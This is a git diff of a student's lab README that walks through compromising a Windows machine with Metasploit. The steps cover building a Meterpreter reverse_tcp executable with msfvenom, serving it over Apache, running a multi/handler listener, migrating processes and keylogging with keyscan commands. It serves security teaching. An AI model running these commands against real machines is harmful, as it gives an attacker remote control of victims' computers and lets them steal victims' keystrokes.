@@ -1,9 +1,11 @@
 # Compromising-windows-using-Metasploit
+
+### NAME: K Charan Teja
+### REG NO:212224040163
+
 Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
-
-### Developed By
 
 # AIM:
 
@@ -24,97 +26,75 @@ Investigate on the various categories of tools as follows:
 Open terminal and try execute some kali linux commands
 
 ## EXECUTION STEPS AND ITS OUTPUT:
-
-
-## Architecture Diagram
-
-```bash
-## 🛠️ Metasploit Exploitation Architecture (Windows Target)
-
-
-+----------------+                           +------------------+
-|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
-|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
-|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
-|  - handler     |                           |                  |
-+-------+--------+                           +--------+---------+
-        |                                             |
-        |  ⚙️ Payload generation using msfvenom        |
-        |                                             |
-        v                                             v
-msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
-         LHOST=attacker_ip LPORT=4444               or exploit triggers  
-         -f exe > evil.exe  
-
-        |
-        |  🧲 Listener waits (multi/handler)
-        v
-
-+------------------------------------------------------------+
-|     🧠 Meterpreter Session Established (shell access)       |
-+------------------------------------------------------------+
-| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
-+------------------------------------------------------------+
-
-```
-### PROGRAM:
-
 Find the attackers ip address using ifconfig
 
-### Output:
+### OUTPUT:
 
+<img width="576" alt="image" src="https://github.com/user-attachments/assets/c06b56b4-a982-40a1-9e7f-7c044328aa84">
 
+Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.175 -f exe > fun.exe
 
-Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
+<img width="713" alt="image" src="https://github.com/user-attachments/assets/1686c359-94b9-4c61-a93a-df218cdedef9">
 
-### Output:
+copy the fun.exe into the apache /var/www/html folder 
 
+<img width="343" alt="image" src="https://github.com/user-attachments/assets/51ce9b94-49e1-4733-9c4a-3c444bfd0a67">
 
+Start apache server sudo systemctl apache2 start
 
-copy the fun.exe into the apache ```/var/www/html ```folder
+<img width="359" alt="image" src="https://github.com/user-attachments/assets/bfb3314a-07c3-4406-a31d-f70c0c25abdb">
 
+Check the status of apache2
 
-
-Start apache server ```sudo systemctl apache2 start``` 
-
-
-
-Check the status of apache2 ```sudo apache2 status```
-
+<img width="874" alt="image" src="https://github.com/user-attachments/assets/040700eb-7642-4493-a10b-d86426b48140">
 
 Invoke msfconsole:
 
+<img width="602" alt="image" src="https://github.com/user-attachments/assets/68b5c816-db23-4fe9-852a-ff1b57819edd">
+
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
-Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
+<img width="827" alt="image" src="https://github.com/user-attachments/assets/b256e88b-fdb7-4604-a3dc-f409383e0d2e">
 
-### Output 
+Starting a command and control Server
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+exploit
 
+<img width="589" alt="image" src="https://github.com/user-attachments/assets/91c9967a-99bf-4db0-9d31-ad8ee165c7f6">
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.4/fun.exe The file "fun.exe" downloads.
 
-
+<img width="363" height="230" alt="380680831-1a211cb7-e49c-4dfb-a4eb-9914aa5fe3dc" src="https://github.com/user-attachments/assets/523434b1-f52b-40a7-a1b5-95561be38253" />
 
 Bypass any warning boxes, double-click the file, and allow it to run.
+
+<img width="354" height="204" alt="380681274-ae00f0c5-39d5-4717-a921-4f9b5a386475" src="https://github.com/user-attachments/assets/6dc4b123-8c2b-4c6b-86da-a785f4c78a2e" />
+
+
+
 On kali give the command exploit
 
-
+<img width="577" alt="image" src="https://github.com/user-attachments/assets/4f20f78f-270f-47f3-8176-4a26ed593b9e">
 
 To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
+
+<img width="857" alt="image" src="https://github.com/user-attachments/assets/37f8c6c2-888b-4d46-a447-89c291975d3c">
 
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
 
 migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
 
-#### Post Exploitation:
-The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+<img width="781" alt="image" src="https://github.com/user-attachments/assets/0aa5dfee-8bf2-4683-999b-c0fb8cc13b14">
+<img width="619" alt="image" src="https://github.com/user-attachments/assets/8c6078c0-ec91-46c7-8a9e-de53239c0e24">
 
 
+Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 
-keyscan_dump Shows the keystrokes captured so far
+keyscan_dump Shows the keystrokes captured so far 
 
-
+![image](https://github.com/user-attachments/assets/ae4261ce-8ebe-4f5e-ae04-89afacdfeeb4)
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
-
